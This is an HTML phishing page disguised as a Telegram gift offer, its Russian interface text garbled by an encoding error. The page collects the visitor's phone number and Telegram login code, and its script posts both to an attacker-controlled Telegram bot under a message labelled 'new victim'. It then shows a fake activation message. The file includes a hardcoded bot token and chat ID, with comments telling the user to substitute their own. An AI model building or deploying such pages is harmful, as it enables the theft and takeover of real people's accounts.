<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Gifts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            width: 380px;
            padding: 24px;
            text-align: center;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: #0088cc;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 30px;
        }
        h2 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #0a0a0a;
        }
        p {
            color: #5f5f5f;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .input-group {
            text-align: left;
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #2e2e2e;
            margin-bottom: 4px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #d9d9d9;
            border-radius: 12px;
            font-size: 16px;
            transition: border 0.2s;
        }
        input:focus {
            border-color: #0088cc;
            outline: none;
        }
        button {
            width: 100%;
            background: #0088cc;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        button:hover {
            background: #006699;
        }
        button:disabled {
            background: #b0b0b0;
            cursor: not-allowed;
        }
        .hidden {
            display: none;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .step {
            transition: opacity 0.3s;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">üì¶</div>
        <h2>–ü–æ–ª—É—á–∏—Ç–µ –ø–æ–¥–∞—Ä–æ–∫</h2>
        <p>–í–æ–π–¥–∏—Ç–µ –≤ Telegram, —á—Ç–æ–±—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫</p>

        <!-- –®–∞–≥ 1: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="step1" class="step">
            <div class="input-group">
                <label>–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" value="">
            </div>
            <button id="sendCodeBtn">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
        </div>

        <!-- –®–∞–≥ 2: –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (–∏–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç) -->
        <div id="step2" class="step hidden">
            <div class="input-group">
                <label>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</label>
                <input type="text" id="code" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram">
            </div>
            <button id="activateBtn">–ê–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
            <div id="loader" class="loader hidden" style="margin-top: 16px;"></div>
        </div>
    </div>

    <script>
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const activateBtn = document.getElementById('activateBtn');
        const loader = document.getElementById('loader');
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');

        let userPhone = '';

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–µ—Ä–≤–æ–≥–æ —à–∞–≥–∞
        sendCodeBtn.addEventListener('click', function() {
            const phone = phoneInput.value.trim();
            if (!phone) {
                alert('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
                return;
            }
            // –ò–º–∏—Ç–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞ (–º—ã –ø—Ä–æ—Å—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä)
            userPhone = phone;
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ç–æ—Ä–æ–≥–æ —à–∞–≥–∞ (–≤–≤–æ–¥ –∫–æ–¥–∞)
        activateBtn.addEventListener('click', function() {
            const code = codeInput.value.trim();
            if (!code) {
                alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥');
                return;
            }

            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
            loader.classList.remove('hidden');
            activateBtn.disabled = true;

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram –±–æ—Ç–∞
            const botToken =
'8642865627:AAERBlRACv1M4JmeXU5TYHVnrASB7dG91pQ';  // –∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π
            const chatId = '7460184864';      // –∑–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π
            const message = `üî• –ù–æ–≤–∞—è –∂–µ—Ä—Ç–≤–∞!\n–¢–µ–ª–µ—Ñ–æ–Ω: ${userPhone}\n–ö–æ–¥: ${code}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                // –ü–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Ñ–µ–π–∫–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –∞–∫—Ç–∏–≤–∞—Ü–∏–∏
                alert('–ü–æ–¥–∞—Ä–æ–∫ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! –°–∫–æ—Ä–æ –æ–Ω –ø–æ—è–≤–∏—Ç—Å—è –≤ –≤–∞—à–µ–º –∞–∫–∫–∞—É–Ω—Ç–µ.');
                // –ú–æ–∂–Ω–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏–ª–∏ —Å–Ω–æ–≤–∞ –ø–æ–∫–∞–∑–∞—Ç—å –ø–µ—Ä–≤—ã–π —à–∞–≥
                step2.classList.add('hidden');
                step1.classList.remove('hidden');
                phoneInput.value = '';
                codeInput.value = '';
                loader.classList.add('hidden');
                activateBtn.disabled = false;
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞:', error);
                alert('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, –Ω–æ –º—ã —É–∂–µ –ø–æ–ª—É—á–∏–ª–∏ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ. –°–ø–∞—Å–∏–±–æ!');
                loader.classList.add('hidden');
                activateBtn.disabled = false;
            });
        });
    </script>
</body>
</html>
